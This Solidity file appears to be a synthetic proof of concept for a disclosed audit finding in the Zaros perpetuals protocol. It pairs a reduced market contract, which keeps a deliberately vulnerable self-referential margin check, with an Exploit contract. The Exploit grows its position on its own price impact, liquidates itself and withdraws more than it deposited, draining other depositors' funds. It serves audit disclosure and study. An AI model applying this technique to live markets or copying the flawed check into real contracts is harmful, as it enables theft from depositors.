// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/*//////////////////////////////////////////////////////////////////////////
    Zaros — Draining the protocol fully
    (fyamf, Codehawks 2024-07-zaros, finding #38003)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable margin-balance computation from fillMarketOrder (used to
    validate a new order's margin requirement) is inlined VERBATIM: it
    values the EXISTING position's unrealized PnL at the price AFTER the
    new order's own price impact is applied — a self-referential check.
    The Exploit deposits real collateral, repeatedly grows its position
    using ITS OWN price impact to manufacture the margin room for each next
    order, then triggers its own liquidation and withdraws MORE than it
    ever deposited (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: opening a new order pushes the market's skew, which
    moves the mark price (price impact). fillMarketOrder validates the
    NEW order's margin requirement using a margin balance that already
    includes the EXISTING position's unrealized PnL — but that PnL is
    valued at the mark price AFTER this same order's own price impact is
    applied. The order's own execution manufactures the exact margin
    headroom used to approve itself. Because the position keeps growing
    (in the same direction, same market), each order's price impact is
    larger than the last, so the manufactured margin grows faster than the
    real margin requirement — an unbounded feedback loop funded entirely by
    the trader's own subsequent orders, not by any real capital.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal token used for margin collateral.
contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced single-trader perpetuals market. Price impact is a
///         simple linear function of skew: markPrice = indexPrice +
///         skew / PRICE_IMPACT_DIVISOR. Margin requirements use a 1%
///         initial margin rate and a 0.5% maintenance margin rate.
contract PerpMarket {
    MockToken public token;

    int256 public constant INDEX_PRICE = 1000;
    int256 public constant PRICE_IMPACT_DIVISOR = 10_000;
    uint256 public constant IMR_NUM = 1; // 1% initial margin requirement
    uint256 public constant IMR_DEN = 100;
    uint256 public constant MMR_NUM = 1; // 0.5% maintenance margin requirement
    uint256 public constant MMR_DEN = 200;
    uint256 public constant LIQUIDATION_FEE = 5_000;

    int256 public skew;
    int256 public size; // the (single) trader's position size, positive = long
    int256 public costBasis; // sum of sizeDelta_i * fillMarkPrice_i
    uint256 public collateral;
    bool public liquidated;

    constructor(MockToken _token) {
        token = _token;
    }

    function markPrice(int256 sk) public pure returns (int256) {
        return INDEX_PRICE + sk / PRICE_IMPACT_DIVISOR;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        collateral += amount;
    }

    /// @notice Reduced fillMarketOrder. Grows the position by `sizeDelta`,
    ///         validating the resulting margin requirement.
    function fillOrder(int256 sizeDelta) external {
        int256 newSkew = skew + sizeDelta;
        int256 newMarkPrice = markPrice(newSkew);

        // The EXISTING position's unrealized PnL, valued at the mark price
        // AFTER this order's OWN price impact — the order manufactures the
        // margin room used to approve itself.
        int256 unrealizedPnl = size * newMarkPrice - costBasis;
        int256 marginBalance = int256(collateral) + unrealizedPnl; // @> VULN: self-referential margin balance

        int256 newSize = size + sizeDelta;
        uint256 requiredMargin = uint256(newSize) * uint256(newMarkPrice) * IMR_NUM / IMR_DEN;

        require(marginBalance >= int256(requiredMargin), "insufficient margin");
        // FIX: value the EXISTING position's unrealized PnL at the PRE-order
        // mark price (before applying this order's own price impact), so a
        // new order cannot use its own price impact to fund its own approval.

        costBasis += sizeDelta * newMarkPrice;
        size = newSize;
        skew = newSkew;
    }

    /// @notice What the margin balance would be if unrealized PnL were NOT
    ///         credited at all (a naive "fixed" comparison) — used by the
    ///         PoC's control test to show growth stops without the
    ///         self-referential credit.
    function marginBalanceWithoutPnlCredit() public view returns (uint256) {
        return collateral;
    }

    function marginBalanceUsd() public view returns (int256) {
        int256 mp = markPrice(skew);
        int256 unrealizedPnl = size * mp - costBasis;
        return int256(collateral) + unrealizedPnl;
    }

    /// @notice Liquidates the (single) trader's position, deducting the
    ///         maintenance margin requirement plus a fixed liquidation fee
    ///         from the margin balance; whatever remains becomes the
    ///         account's new (withdrawable) collateral.
    function liquidate() external returns (uint256 remainder) {
        require(!liquidated, "already liquidated");
        int256 mp = markPrice(skew);
        uint256 requiredMaintenanceMargin = uint256(size) * uint256(mp) * MMR_NUM / MMR_DEN;

        int256 mb = marginBalanceUsd();
        uint256 marginBalance = mb > 0 ? uint256(mb) : 0;

        uint256 deduction = requiredMaintenanceMargin + LIQUIDATION_FEE;
        deduction = deduction > marginBalance ? marginBalance : deduction;

        remainder = marginBalance - deduction;
        collateral = remainder;
        size = 0;
        skew = 0;
        costBasis = 0;
        liquidated = true;
    }

    function withdraw(address recipient, uint256 amount) external {
        require(amount <= collateral, "insufficient collateral");
        collateral -= amount;
        token.transfer(recipient, amount);
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    PerpMarket public market; // CREATE nonce 2

    uint256 public constant DEPOSIT_AMOUNT = 1_000_000;
    // Other honest depositors' pooled collateral already sitting in the
    // market's vault (LPs on the other side of the trade / insurance fund).
    // This is what actually gets drained: the attacker's own real deposit
    // alone cannot back the inflated withdrawal below.
    uint256 public constant OTHER_DEPOSITORS_POOL = 500_000;

    constructor() {
        token = new MockToken(); // nonce 1
        market = new PerpMarket(token); // nonce 2
        token.mint(address(this), DEPOSIT_AMOUNT);
        token.mint(address(market), OTHER_DEPOSITORS_POOL);
    }

    /// @notice Deposits a real 1,000,000 units of collateral, then grows a
    ///         long position across 3 orders — each order's OWN price
    ///         impact manufactures the margin headroom that approves it.
    ///         Triggers self-liquidation and withdraws MORE than the
    ///         original real deposit.
    function run() external {
        market.deposit(DEPOSIT_AMOUNT);
        require(token.balanceOf(address(this)) == 0, "unexpected token balance after deposit");

        // Order 1: opens the position. Real collateral alone easily covers this.
        market.fillOrder(92_000);

        // Iteration 1: this order's OWN price impact (skew 92k -> 152k)
        // inflates the existing 92k position's unrealized PnL enough to
        // cover the new, larger required margin.
        market.fillOrder(60_000);

        // Iteration 2: repeats the same trick at a larger scale.
        market.fillOrder(60_000);

        int256 mb = market.marginBalanceUsd();
        require(mb == 2_464_000, "unexpected margin balance");

        // HARM SETUP: the manufactured margin balance (2,464,000) is far
        // beyond what the real 1,000,000 deposit could ever support at
        // this position size under an honest (pre-impact) valuation.
        require(uint256(mb) > DEPOSIT_AMOUNT, "expected margin balance to exceed real deposit");

        uint256 remainder = market.liquidate();
        require(remainder == 1_376_740, "unexpected remainder after liquidation");

        market.withdraw(address(this), remainder);

        uint256 finalBalance = token.balanceOf(address(this));
        require(finalBalance == remainder, "unexpected final token balance");

        // HARM: even AFTER being liquidated, the trader walks away with
        // more than their real deposit.
        require(finalBalance > DEPOSIT_AMOUNT, "expected trader to profit beyond their real deposit");

        uint256 profit = finalBalance - DEPOSIT_AMOUNT;
        require(profit == 376_740, "unexpected profit");

        // HARM CONFIRMED: the attacker's own real deposit (1,000,000) could
        // never have backed this withdrawal on its own (remainder >
        // DEPOSIT_AMOUNT already proves that). The extra 376,740 comes
        // straight out of the vault's pooled collateral belonging to other,
        // honest depositors (OTHER_DEPOSITORS_POOL = 500,000) — the market's
        // remaining real token balance now backs LESS than the pool other
        // depositors are entitled to.
        uint256 marketRemainingTokens = token.balanceOf(address(market));
        require(marketRemainingTokens < OTHER_DEPOSITORS_POOL, "expected other depositors' pool to be drained into shortfall");
    }
}
